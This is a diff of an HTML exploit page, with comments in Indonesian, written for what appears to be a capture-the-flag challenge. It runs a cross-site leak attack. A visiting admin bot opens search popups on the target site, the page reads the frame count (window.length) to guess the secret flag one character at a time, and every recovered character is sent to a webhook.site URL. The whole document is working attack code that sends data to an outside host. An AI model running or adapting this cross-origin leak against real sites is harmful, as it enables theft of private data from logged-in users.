@@ -1,89 +1,56 @@
 <!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <title>Exploit</title>
-</head>
+<html>
 <body>
-    <h1 id="status">Memulai Serangan...</h1>
-    <div id="logs"></div>
-
     <script>
-        // 1. KONFIGURASI (WAJIB DIUBAH)
         const targetBase = "https://ponder.cbd2026.cloud/search?q=";
         const webhook = "https://webhook.site/76c1a3f4-7985-4c73-9f7d-1d28bae13e25"; 
-
-        // 2. STATE
         let flag = "flag{"; 
         const alphabet = "abcdefghijklmnopqrstuvwxyz0123456789_}";
-        
-        const log = (msg) => {
-            console.log(msg);
-            document.getElementById('logs').innerHTML += `<p>${msg}</p>`;
-        };
 
-        // 3. PING (Untuk memastikan bot sudah masuk ke halaman ini)
-        fetch(`${webhook}?status=bot_sampai_di_github`);
+        fetch(`${webhook}?status=skrip_dimulai_oleh_bot`);
 
         async function tryChar(char) {
             return new Promise((resolve) => {
                 const query = flag + char;
                 const win = window.open(`${targetBase}${encodeURIComponent(query)}`);
 
-                // Tunggu sedikit lebih lama (800ms) agar halaman search benar-benar termuat
+                // Jika popup diblokir, beritahu webhook
+                if (!win) {
+                    fetch(`${webhook}?error=popup_blocked_by_bot`);
+                    resolve(false);
+                    return;
+                }
+
                 setTimeout(() => {
-                    try {
-                        // Jika single_match=True, maka len(matches) == 1 dan <iframe> muncul
-                        // window.length akan bernilai 1.
-                        if (win.length === 3) {
-                            win.close();
-                            resolve(true);
-                        } else {
-                            win.close();
-                            resolve(false);
-                        }
-                    } catch (e) {
-                        // Jika terjadi error (misal window sudah tertutup/blocked)
-                        win.close();
+                    const lengthFound = win.length;
+                    win.close();
+                    
+                    // Kirim log debug ke webhook untuk setiap karakter yang dicoba
+                    fetch(`${webhook}?char=${char}&len=${lengthFound}`);
+
+                    // KONDISI UTAMA: Sesuaikan angka ini berdasarkan hasil debug nanti
+                    // Biasanya single_match=True akan menghasilkan 1 iframe
+                    if (lengthFound === 1) {
+                        resolve(true);
+                    } else {
                         resolve(false);
                     }
-                }, 2000); 
+                }, 1500); // Jeda 1.5 detik agar halaman stabil
             });
         }
 
-        async function startBruteForce() {
-            log(`Mencari karakter setelah: ${flag}`);
-            
+        async function start() {
             for (let char of alphabet) {
-                log(`Mencoba: ${flag}${char}`);
-                
-                const found = await tryChar(char);
-                
-                if (found) {
+                if (await tryChar(char)) {
                     flag += char;
-                    log(`BERHASIL: ${flag}`);
-                    
-                    // Kirim progres ke Webhook
-                    fetch(`${webhook}?found=${encodeURIComponent(flag)}`);
-
-                    if (char === "}") {
-                        log("Flag Lengkap Ditemukan!");
-                        fetch(`${webhook}?status=SELESAI&final_flag=${encodeURIComponent(flag)}`);
-                        return;
-                    }
-                    
-                    // Mulai lagi dari karakter pertama alphabet untuk posisi selanjutnya
-                    return startBruteForce();
+                    fetch(`${webhook}?SUCCESS_FOUND=${encodeURIComponent(flag)}`);
+                    if (char === "}") return;
+                    return start(); // Rekursi untuk karakter selanjutnya
                 }
             }
-            log("Gagal menemukan karakter selanjutnya. Coba periksa koneksi atau timing.");
         }
 
-        // Jalankan saat halaman dimuat
-        // Bot admin di tantangan ini biasanya mengizinkan popup secara otomatis
-        window.onload = () => {
-            startBruteForce();
-        };
+        window.onload = start;
     </script>
 </body>
 </html>
